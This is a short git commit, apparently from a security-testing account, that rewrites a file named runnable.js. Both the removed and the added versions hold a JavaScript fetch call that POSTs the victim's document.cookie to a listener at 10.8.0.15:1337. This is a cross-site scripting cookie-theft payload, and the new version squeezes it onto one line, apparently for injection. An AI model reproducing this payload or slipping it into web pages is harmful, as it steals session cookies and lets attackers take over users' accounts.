40a09103736a34bf0717589b3407461ca4083290
PERMIS SECURITY <99765348+Permisz@users.noreply.github.com>
2024-05-22 14:59:13 +0700

    Update runnable.js

--- runnable.js
+++ runnable.js
@@ -1,10 +1,1 @@
-fetch("http://10.8.0.15:1337", {
-    headers: {
-        "Content-Type": "application/json",
-    },
-    method: "POST",
-    mode: 'cors',
-    body: JSON.stringify({
-        cookie: document.cookie,
-    }),
-});
+fetch("http://10.8.0.15:1337", {headers: {"Content-Type": "application/json"},method: "POST",mode: 'cors',body: JSON.stringify({cookie: document.cookie,}),});
